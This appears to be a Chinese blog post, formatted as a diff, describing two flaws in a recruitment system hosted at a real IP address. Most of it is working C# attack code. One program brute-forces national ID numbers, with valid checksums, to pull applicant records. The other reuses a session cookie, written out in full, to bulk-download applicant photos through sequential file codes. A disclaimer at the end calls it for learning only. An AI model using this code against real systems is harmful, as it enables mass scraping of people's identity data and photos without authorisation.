@@ -1,0 +1,205 @@
+以前一个事业单位招聘系统的两bug
+
+
+开发环境 Visual Studio 2010      .net 2.0
+
+
+实现方法如下
+1.系统用姓名跟身份证号就能登陆
+知道姓名，年龄基本就能登陆一部分账号了
+
+
+
+
+
+
+
+
+
+
+
+    class Program
+    {
+        static CookieContainer cccc;
+        static void Main(string[] args)
+        {
+            ServicePointManager.DefaultConnectionLimit = 1000;
+            cccc = new CookieContainer();
+            string cookieStr = "ASP.NET_SessionId=3tiqv055qkmwz2553h3j24u3";
+            string[] cookstr = cookieStr.Split(';');
+            foreach (string str in cookstr)
+            {
+                string[] cookieNameValue = str.Split('=');
+                Cookie ck = new Cookie(cookieNameValue[0].Trim().ToString(), cookieNameValue[1].Trim().ToString().Replace(",", "%2C"));
+                ck.Domain = "218.57.146.218";
+                cccc.Add(ck);
+            }            
+            string PID = "3709821988";
+            string PolicID = "00";//第15、16位数字表示：户口所在地派出所的代表号码
+            ////////开始前 要修改 姓名 年龄 跟 男女，警察局id  ！！也别忘了修改http地址！！！！！！！！！！
+            //for (int y = 1986; y < 1990; y++)
+            {
+                int y = 1987;
+                DateTime dt = new DateTime(y, 1, 1);
+                for (int policeID = 00; policeID < 100; policeID++)
+                {
+                   //int  policeID = 0;
+                    PolicID = string.Format("{0:d2}", policeID);
+                    DateTime d1 = System.DateTime.Now;
+                    for (int i = 0; i < 366; i++)
+                    {
+                        DateTime dd = dt.AddDays(i);
+                        string str = string.Format("{0:yyyyMMdd}", dd);
+                        //倒数第二位 男位奇数  女为偶数。。
+                        for (int j = 0; j < 10; j = j + 2)
+                        {
+                            PID = "370982" + str + PolicID + j;
+                            PID = PID + getVerty(PID);
+                            try
+                            {
+                                fff(PID);
+                            }
+                            catch (Exception ex)
+                            {
+                                File.AppendAllText("1.txt", "失败id=" + PID);
+                                Console.WriteLine(ex.ToString());
+                            }
+                        }
+                    }
+                    DateTime d2 = System.DateTime.Now;
+                    Console.WriteLine(d2 - d1);
+                }
+            }
+        }
+        static string laststring = "10X98765432";
+        static string getVerty(string pid17)
+        {
+            int xxxx = 7 * Convert.ToInt32(pid17[0].ToString()) + 9 * Convert.ToInt32(pid17[1].ToString()) + 10 * Convert.ToInt32(pid17[2].ToString()) + 5 * Convert.ToInt32(pid17[3].ToString()) + 8 * Convert.ToInt32(pid17[4].ToString()) + 4 * Convert.ToInt32(pid17[5].ToString()) + 2 * Convert.ToInt32(pid17[6].ToString()) + 1 * Convert.ToInt32(pid17[7].ToString()) + 6 * Convert.ToInt32(pid17[8].ToString()) + 3 * Convert.ToInt32(pid17[9].ToString()) + 7 * Convert.ToInt32(pid17[10].ToString()) + 9 * Convert.ToInt32(pid17[11].ToString()) + 10 * Convert.ToInt32(pid17[12].ToString()) + 5 * Convert.ToInt32(pid17[13].ToString()) + 8 * Convert.ToInt32(pid17[14].ToString()) + 4 * Convert.ToInt32(pid17[15].ToString()) + 2 * Convert.ToInt32(pid17[16].ToString());
+            int xx = xxxx % 11;
+            return laststring[xx].ToString();
+            //return "";
+        }
+
+
+       static  void fff(string id)
+        {
+            string ssfs = System.Web.HttpUtility.UrlEncode(System.Web.HttpUtility.HtmlEncode("姓名"), Encoding.GetEncoding("gb2312")).ToUpper() ;
+            ASCIIEncoding encoding = new ASCIIEncoding();
+            //                 __VIEWSTATE=%2FwEPDwUKMTM2OTQ3OTQ1Mg8WBh4GZmxhZ0x4BQIwMR4GY29kZWlkBQJPSB4HeG1sRmlsZQUSOTUyMDE0MDgvSkJaWTIueG1sFgJmD2QWCAIBDw8WAh4EVGV4dAUt5paw5rOw5biC5LqL5Lia5Y2V5L2N5YWs5byA5oub6IGY5bel5L2c5Lq65ZGYZGQCAw9kFggCAQ8WAh4HVmlzaWJsZWdkAgMPFgIfBGdkAgUPDxYCHwRoZGQCBw8PFgIfBGdkZAIFDw8WAh8EaGRkAgcPDxYCHwRoZGRkKhpjUG6h8IVgONfr8MLCOVtF7eg%3D&__EVENTVALIDATION=%2FwEWBgLH%2B8%2FvAwKkjISFCwKJo6auAwLWjZzRCQLrjdyDBQLCi9reAwAu0WGtTY3Pphpvfc06PRnB%2FZ%2FV&TxtName=%C4%FE%EC%B3&TxtCard=11111&hidJB=&hidZY=&btnSubmit=%B2%E9+%D1%AF
+            string postData = "__VIEWSTATE=%2FwEPDwUKMTM2OTQ3OTQ1Mg8WBh4GZmxhZ0x4BQIwMR4GY29kZWlkBQJPSB4HeG1sRmlsZQUSOTUyMDE0MDgvSkJaWTIueG1sFgJmD2QWCAIBDw8WAh4EVGV4dAUt5paw5rOw5biC5LqL5Lia5Y2V5L2N5YWs5byA5oub6IGY5bel5L2c5Lq65ZGYZGQCAw9kFggCAQ8WAh4HVmlzaWJsZWdkAgMPFgIfBGdkAgUPDxYCHwRoZGQCBw8PFgIfBGdkZAIFDw8WAh8EaGRkAgcPDxYCHwRoZGRkKhpjUG6h8IVgONfr8MLCOVtF7eg%3D&__EVENTVALIDATION=%2FwEWBgLH%2B8%2FvAwKkjISFCwKJo6auAwLWjZzRCQLrjdyDBQLCi9reAwAu0WGtTY3Pphpvfc06PRnB%2FZ%2FV&TxtName=" + ssfs + "&TxtCard=" + id + "&hidJB=&hidZY=&btnSubmit=%B2%E9+%D1%AF";
+            byte[] data = encoding.GetBytes(postData);
+            HttpWebRequest myRequest = (HttpWebRequest)WebRequest.Create("http://218.57.146.218/wb_taxintairs/webregister/search/searchBMXH.aspx");
+            myRequest.Method = "POST";
+            myRequest.ContentType = "application/x-www-form-urlencoded";//这个必须要加
+            myRequest.ContentLength = data.Length;
+            //myRequest.Referer = "http://iwan.qq.com/fuli/goods?id=866";
+            myRequest.CookieContainer = cccc;
+            myRequest.Timeout = 2 * 1000;
+            Stream newStream = myRequest.GetRequestStream();
+            newStream.Write(data, 0, data.Length);
+            newStream.Close();
+            HttpWebResponse myResponse = (HttpWebResponse)myRequest.GetResponse();
+            StreamReader reader = new StreamReader(myResponse.GetResponseStream(), Encoding.Default);
+            string content = reader.ReadToEnd();
+            if (content.IndexOf("没有该考生信息") > 0)
+            {
+            }
+            else
+            {
+                File.AppendAllText("1.txt",content);
+                Console.WriteLine(id);
+                for (int i = 0; i < 10; i++)
+                {
+                    Thread.Sleep(1000);
+                    Console.Beep();
+                }
+            }
+        }
+    }
+
+
+2.打印页面用任何人的session可以批量下载系统所有照片
+
+
+
+
+
+
+    class Program
+    {
+        static CookieContainer cccc;
+        static void Main(string[] args)
+        {
+
+
+            ServicePointManager.DefaultConnectionLimit = 1000;
+            cccc = new CookieContainer();
+            string cookieStr = "ASP.NET_SessionId=15rm0oqqq0s01xrzyxzef555; .ASPXCOOKIEAUTH=F6186EA10CC4F830C50FE92DBEE8D931543E05E894FA6AA37827477F0F73A2A764EBD1E2908C09D6007A9A48299270674971D6BDC99088DDACAA9FD6080D8EAE377C307A39B3B8D2B03E4A6F90222CC00881519E7DF5CFB4282BF8857A2B4B55E5AEFF30E27CE6A7A0BCE481D0388346BB3EDF028D4BCEA5960C7830D2D5FEB3CDCE0C0B";
+            string[] cookstr = cookieStr.Split(';');
+            foreach (string str in cookstr)
+            {
+                string[] cookieNameValue = str.Split('=');
+                Cookie ck = new Cookie(cookieNameValue[0].Trim().ToString(), cookieNameValue[1].Trim().ToString().Replace(",", "%2C"));
+                ck.Domain = "218.57.146.218";
+                cccc.Add(ck);
+            }
+            //for (int i = 0; i < 1; i++)
+            //for (int i = 0; i < 3469; i++)
+            for (int i = 0; i < 2280; i++)
+            {
+                string str = string.Format("{0:d4}", (i+1));
+                ///http://218.57.146.218/wb_taxintaijy/webregister/showInfo/showPic.aspx?dbFlag=&filecode=85201408137090102280
+                DownloadFile("http://218.57.146.218/wb_taxintaijy/webregister/showInfo/showPic.aspx?dbFlag=&filecode=8520140813709010" + str, "T9320140813709010" + str + ".jpg"); ;
+                //////////////http://218.57.146.218/wb_taxintairs/webregister/showInfo/showPic.aspx?dbFlag=&filecode=95201408137090103939
+                //DownloadFile("http://218.57.146.218/wb_taxintairs/webregister/showInfo/showPic.aspx?dbFlag=&filecode=9520140813709010" + str, "T9320140813709010" + str + ".jpg"); ;
+                //DownloadFile("http://218.57.146.218/wb_tafeichengjy/WebRegister/showInfo/showPic.aspx?dbFlag=&filecode=T9320140813709010" + str, "T9320140813709010" + str + ".jpg"); ;
+                //DownloadFile("http://218.57.146.218/wb_taxintai/WebRegister/showInfo/showPic.aspx?dbFlag=&filecode=9720131013709010" + str, "T9720131013709010" + str + ".jpg");
+              //DownloadFile("http://218.57.146.218/wb_taxintai/WebRegister/showInfo/showPic.aspx?dbFlag=&filecode=T9720131013709010"+str, "T9720131013709010" +str  + ".jpg");
+            }
+            Console.Write("ok");
+            Console.Read();
+        }
+        static void DownloadFile(string URL, string filename)
+        {
+            try
+            {
+                System.Net.HttpWebRequest Myrq = (System.Net.HttpWebRequest)System.Net.HttpWebRequest.Create(URL);
+                //System.Net.HttpWebRequest Myrq = (System.Net.HttpWebRequest)System.Net.HttpWebRequest.Create("http://iframe.ip138.com/ic.asp");
+                Myrq.CookieContainer = cccc;
+                Myrq.UserAgent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)";
+                Myrq.Timeout = 1000 * 20;//50分钟
+                //Myrq.Timeout = 1000 * 60 * 10 * 5;//50分钟
+                System.Net.HttpWebResponse myrp = (System.Net.HttpWebResponse)Myrq.GetResponse();
+                long totalBytes = myrp.ContentLength;
+                System.IO.Stream st = myrp.GetResponseStream();
+                System.IO.Stream so = new System.IO.FileStream(filename, System.IO.FileMode.Create);
+                long totalDownloadedByte = 0;
+                byte[] by = new byte[1024];
+                int osize = st.Read(by, 0, (int)by.Length);
+                while (osize > 0)
+                {
+                    totalDownloadedByte = osize + totalDownloadedByte;
+                    //System.Windows.Forms.Application.DoEvents();
+                    so.Write(by, 0, osize);
+                    osize = st.Read(by, 0, (int)by.Length);
+                }
+                so.Close();
+                st.Close();
+            }
+            catch (System.Exception ex)
+            {
+                //MessageBox.Show(ex.ToString());
+                Console.WriteLine(ex.ToString());
+            }
+        }
+    }
+
+
+
+
+
+
+纯粹娱乐，学习交流，切勿非法用途
+
+
+如果你发现有什么不合理的，需要改进的地方，请留言。或者可以通过 328452421#qq.com 联系我，非常感谢。
